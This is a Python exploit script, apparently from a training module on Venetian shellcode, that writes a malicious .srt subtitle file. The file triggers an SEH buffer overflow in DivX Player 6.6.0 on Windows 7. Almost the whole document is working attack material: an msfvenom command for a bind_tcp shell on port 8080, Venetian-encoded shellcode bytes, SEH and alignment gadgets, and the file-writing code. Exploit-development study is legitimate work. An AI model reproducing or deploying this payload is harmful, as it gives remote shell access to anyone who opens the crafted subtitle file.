# Module 0x04, Venetian Shellcode

#!/usr/bin/python
# This is DivX Player 6.6.0 SEH buffer overflow for Windows 7, as done in OFFSEC's AWE in Vista
# Venetian encoder alignment borrowed from Phrack, not AWE
# Windows 7 x86 SP1 // DivX Player 6.6.0 .SRT buffer overflow

# I love you Tai Truscott


# 06F4E494   B9 000200AA      MOV ECX,AA000200
#06F4E499   02C5             ADD AL,CH
#06F4E49B   90               NOP
#06F4E49C   70 00            JO SHORT 06F4E49E
#06F4E49E   70 00            JO SHORT 06F4E4A0
#06F4E4A0   70 00            JO SHORT 06F4E4A2



# Author: r0ss1n1 // Charles Truscott

output = "overflow.srt"


# msfvenom -p x86/windows/shell/bind_tcp LPORT=8080 -e x86/shikata_ga_nai -b "\xd0\x0d\x0a\x5c\x00" -f raw > s.bin
# awe-venetian-encoder.py s.bin 

writer = ("\x80\xde\x6D\x40\x6D\x40\x6d\x80\x74\x6D\x40\x6D\x40\x6d\x80\xf4"
"\x6D\x40\x6D\x40\x6d\x80\xe9\x6D\x40\x6D\x40\x6d\x80\x16\x6D\x40"
"\x6D\x40\x6d\x80\x5b\x6D\x40\x6D\x40\x6d\x80\xc9\x6D\x40\x6D\x40"
"\x6d\x80\x4e\x6D\x40\x6D\x40\x6d\x80\xeb\x6D\x40\x6D\x40\x6d\x80"
"\x31\x6D\x40\x6D\x40\x6d\x80\x14\x6D\x40\x6D\x40\x6d\x80\x73\x6D"
"\x40\x6D\x40\x6d\x80\x18\x6D\x40\x6D\x40\x6d\x80\x61\x6D\x40\x6D"
"\x40\x6d\x80\x5e\x6D\x40\x6D\x40\x6d\x80\x9a\x6D\x40\x6D\x40\x6d"
"\x80\x3f\x6D\x40\x6D\x40\x6d\x80\x7f\x6D\x40\x6D\x40\x6d\x80\x7f"
"\x6D\x40\x6D\x40\x6d\x80\xf4\x6D\x40\x6D\x40\x6d\x80\xb0\x6D\x40"
"\x6D\x40\x6d\x80\x58\x6D\x40\x6D\x40\x6d\x80\x3b\x6D\x40\x6D\x40"
"\x6d\x80\x49\x6D\x40\x6D\x40\x6d\x80\x49\x6D\x40\x6D\x40\x6d\x80"
"\x7e\x6D\x40\x6D\x40\x6d\x80\xe7\x6D\x40\x6D\x40\x6d\x80\xb0\x6D"
"\x40\x6D\x40\x6d\x80\x54\x6D\x40\x6D\x40\x6d\x80\xd3\x6D\x40\x6D"
"\x40\x6d\x80\xa7\x6D\x40\x6D\x40\x6d\x80\x33\x6D\x40\x6D\x40\x6d"
"\x80\x67\x6D\x40\x6D\x40\x6d\x80\x32\x6D\x40\x6D\x40\x6d\x80\x95"
"\x6D\x40\x6D\x40\x6d\x80\x66\x6D\x40\x6D\x40\x6d\x80\xd1\x6D\x40"
"\x6D\x40\x6d\x80\x97\x6D\x40\x6D\x40\x6d\x80\xac\x6D\x40\x6D\x40"
"\x6d\x80\x1c\x6D\x40\x6D\x40\x6d\x80\x21\x6D\x40\x6D\x40\x6d\x80"
"\xc0\x6D\x40\x6D\x40\x6d\x80\x40\x6D\x40\x6D\x40\x6d\x80\x57\x6D"
"\x40\x6D\x40\x6d\x80\x1a\x6D\x40\x6D\x40\x6d\x80\x59\x6D\x40\x6D"
"\x40\x6d\x80\x17\x6D\x40\x6D\x40\x6d\x80\x41\x6D\x40\x6D\x40\x6d"
"\x80\x12\x6D\x40\x6D\x40\x6d\x80\xfa\x6D\x40\x6D\x40\x6d\x80\xe8"
"\x6D\x40\x6D\x40\x6d\x80\x2b\x6D\x40\x6D\x40\x6d\x80\x11\x6D\x40"
"\x6D\x40\x6d\x80\x12\x6D\x40\x6D\x40\x6d\x80\xe0\x6D\x40\x6D\x40"
"\x6d\x80\x53\x6D\x40\x6D\x40\x6d\x80\x1b\x6D\x40\x6D\x40\x6d\x80"
"\xad\x6D\x40\x6D\x40\x6d\x80\xa6\x6D\x40\x6D\x40\x6d\x80\x69\x6D"
"\x40\x6D\x40\x6d\x80\x7c\x6D\x40\x6D\x40\x6d\x80\x6a\x6D\x40\x6D"
"\x40\x6d\x80\xf6\x6D\x40\x6D\x40\x6d\x80\x56\x6D\x40\x6D\x40\x6d"
"\x80\xdb\x6D\x40\x6D\x40\x6d\x80\x1c\x6D\x40\x6D\x40\x6d\x80\x90"
"\x6D\x40\x6D\x40\x6d\x80\x7a\x6D\x40\x6D\x40\x6d\x80\x27\x6D\x40"
"\x6D\x40\x6d\x80\xf1\x6D\x40\x6D\x40\x6d\x80\xac\x6D\x40\x6D\x40"
"\x6d\x80\xd6\x6D\x40\x6D\x40\x6d\x80\xf6\x6D\x40\x6D\x40\x6d\x80"
"\xf2\x6D\x40\x6D\x40\x6d\x80\xac\x6D\x40\x6D\x40\x6d\x80\xa3\x6D"
"\x40\x6D\x40\x6d\x80\x03\x6D\x40\x6D\x40\x6d\x80\xb4\x6D\x40\x6D"
"\x40\x6d\x80\xfb\x6D\x40\x6D\x40\x6d\x80\xbe\x6D\x40\x6D\x40\x6d"
"\x80\xe8\x6D\x40\x6D\x40\x6d\x80\x9d\x6D\x40\x6D\x40\x6d\x80\xdd"
"\x6D\x40\x6D\x40\x6d\x80\x1e\x6D\x40\x6D\x40\x6d\x80\x49\x6D\x40"
"\x6D\x40\x6d\x80\x6d\x6D\x40\x6D\x40\x6d\x80\xd6\x6D\x40\x6D\x40"
"\x6d\x80\xf9\x6D\x40\x6D\x40\x6d\x80\x9e\x6D\x40\x6D\x40\x6d\x80"
"\xfd\x6D\x40\x6D\x40\x6d\x80\xb5\x6D\x40\x6D\x40\x6d\x80\x91\x6D"
"\x40\x6D\x40\x6d\x80\x36\x6D\x40\x6D\x40\x6d\x80\xbb\x6D\x40\x6D"
"\x40\x6d\x80\x62\x6D\x40\x6D\x40\x6d\x80\xd3\x6D\x40\x6D\x40\x6d"
"\x80\x0b\x6D\x40\x6D\x40\x6d\x80\x23\x6D\x40\x6D\x40\x6d\x80\xde"
"\x6D\x40\x6D\x40\x6d\x80\x28\x6D\x40\x6D\x40\x6d\x80\xb1\x6D\x40"
"\x6D\x40\x6d\x80\xd2\x6D\x40\x6D\x40\x6d\x80\x30\x6D\x40\x6D\x40"
"\x6d\x80\x2f\x6D\x40\x6D\x40\x6d\x80\xd9\x6D\x40\x6D\x40\x6d\x80"
"\xf0\x6D\x40\x6D\x40\x6d\x80\xe2\x6D\x40\x6D\x40\x6d\x80\x99\x6D"
"\x40\x6D\x40\x6d\x80\x1f\x6D\x40\x6D\x40\x6d\x80\xb9\x6D\x40\x6D"
"\x40\x6d\x80\x96\x6D\x40\x6D\x40\x6d\x80\xaf\x6D\x40\x6D\x40\x6d"
"\x80\xff\x6D\x40\x6D\x40\x6d\x80\x58\x6D\x40\x6D\x40\x6d\x80\x24"
"\x6D\x40\x6D\x40\x6d\x80\xff\x6D\x40\x6D\x40\x6d\x80\x0e\x6D\x40"
"\x6D\x40\x6d\x80\x3f\x6D\x40\x6D\x40\x6d\x80\xe9\x6D\x40\x6D\x40"
"\x6d\x80\xa8\x6D\x40\x6D\x40\x6d\x80\xe0\x6D\x40\x6D\x40\x6d\x80"
"\xd7\x6D\x40\x6D\x40\x6d\x80\x26\x6D\x40\x6D\x40\x6d\x80\x4f\x6D"
"\x40\x6D\x40\x6d\x80\x25\x6D\x40\x6D\x40\x6d\x80\x71\x6D\x40\x6D"
"\x40\x6d\x80\x60\x6D\x40\x6D\x40\x6d\x80\xe6\x6D\x40\x6D\x40\x6d"
"\x80\xfe\x6D\x40\x6D\x40\x6d\x80\x45\x6D\x40\x6D\x40\x6d\x80\xfe"
"\x6D\x40\x6D\x40\x6d\x80\x3c\x6D\x40\x6D\x40\x6d\x80\x6a\x6D\x40"
"\x6D\x40\x6d\x80\x97\x6D\x40\x6D\x40\x6d\x80\x02\x6D\x40\x6D\x40"
"\x6d\x80\xce\x6D\x40\x6D\x40\x6d\x80\x8d\x6D\x40\x6D\x40\x6d\x80"
"\x25\x6D\x40\x6D\x40\x6d\x80\xca\x6D\x40\x6D\x40\x6d\x80\xb8\x6D"
"\x40\x6D\x40\x6d\x80\xa0\x6D\x40\x6D\x40\x6d\x80\x2e\x6D\x40\x6D"
"\x40\x6d\x80\xde\x6D\x40\x6D\x40\x6d\x80\xbe\x6D\x40\x6D\x40\x6d"
"\x80\x1e\x6D\x40\x6D\x40\x6d\x80\xd4\x6D\x40\x6D\x40\x6d\x80\x76"
"\x6D\x40\x6D\x40\x6d\x80\x8c\x6D\x40\x6D\x40\x6d\x80\x63\x6D\x40"
"\x6D\x40\x6d\x80\x18\x6D\x40\x6D\x40\x6d\x80\x38\x6D\x40\x6D\x40"
"\x6d\x80\xa3\x6D\x40\x6D\x40\x6d\x80\xec\x6D\x40\x6D\x40\x6d\x80"
"\xcb\x6D\x40\x6D\x40\x6d\x80\xcb\x6D\x40\x6D\x40\x6d\x80\x54\x6D"
"\x40\x6D\x40\x6d\x80\x3e\x6D\x40\x6D\x40\x6d\x80\x93\x6D\x40\x6D"
"\x40\x6d\x80\xbf\x6D\x40\x6D\x40\x6d\x80\x65\x6D\x40\x6D\x40\x6d"
"\x80\x16\x6D\x40\x6D\x40\x6d\x80\x10\x6D\x40\x6D\x40\x6d\x80\xaa"
"\x6D\x40\x6D\x40\x6d\x80\x2a\x6D\x40\x6D\x40\x6d\x80\x8f\x6D\x40"
"\x6D\x40\x6d\x80\xa1\x6D\x40\x6D\x40\x6d\x80\x83\x6D\x40\x6D\x40"
"\x6d\x80\xe3\x6D\x40\x6D\x40\x6d")

half = ("\xdb\xd9\x24\xbe\xfa\x9d\x31\xb1\x83\xfc\x73\x03\xfd\xe3\x15\x0c"
"\xe5\x84\xd4\xf2\x46\x70\x6a\xd4\xf9\xf1\x4a\x27\x4b\x1b\xcf\x48"
"\xee\x9d\x37\x6c\xe0\xc3\x85\xdf\xd5\x58\xad\x49\xa6\x49\x6b\xc0"
"\x68\x9a\x5a\x1d\x93\xb1\x1c\xcb\x9a\xbe\xd9\xb9\xa0\x4f\x02\xf7"
"\xb3\x6e\xbf\xe5\xa3\x29\xdf\xcc\x56\xea\x33\x93\x99\xab\x42\x09"
"\x6e\x23\xe6\x09\xf6\x19\xc4\xb1\x64\x1f\x8b\xd8\x72\x19\xb0\x49"
"\x11\x02\x9e\xbf\x39\xdd\xd3\x48\x4b\x83\x6b\x49\x03\x72\x43\x94"
"\x73\x0f\xb1\x98\xca\x62\x41\x3a\x1e\xfd\x9f\xaa\x2b\x6e\x2c\xc6"
"\xba\x87\x5b\x8d\x9b\x2a\xcc\x30\x3a\xcb\x39\x34\x10\x03\x2a\x6b"
"\xaa\x3a\xaa\x9a\xf9\xe5\x6e\x70\xc6\xd3\xe4\x14\x17\x27\xe7\x2f"
"\x24\xf6\x43\x4d\x26\xe4\x48\xf7")

seh = "\x94\x48"
xchg_esp = "\x94\x6d"
xchg_ecx = "\x91\x6d"
ALIGN = "\x05\xff\x3c\x6d\x2d\x08\x3c\x6d"
ALIGN2 = "\x6d\x05\xff\x3c\x6d\x2d\xf4\x3c\x6d"
push_eax = "\x50\x6d"
retn_eax = "\xc3\x6d\xc3"
buffer_adjust = "\x70" * 29466
write_adjust = "\x01" * 216
stub = "\x41" * 1032 + seh + xchg_esp + xchg_ecx + ALIGN + push_eax + retn_eax + buffer_adjust + ALIGN2 + "\xB9\x02\xAA\xe8\x6d\x70\x70" + writer + write_adjust + half + "\x43" * (5000000 - len(buffer_adjust) - len(writer) - 1067 - len(write_adjust) - len(half))

f = open(output, 'w')
f.write("1 \n")
f.write("00:00:01,001 --> 00:00:02,001\n")
f.write(stub)
f.close

print ".srt created\n"

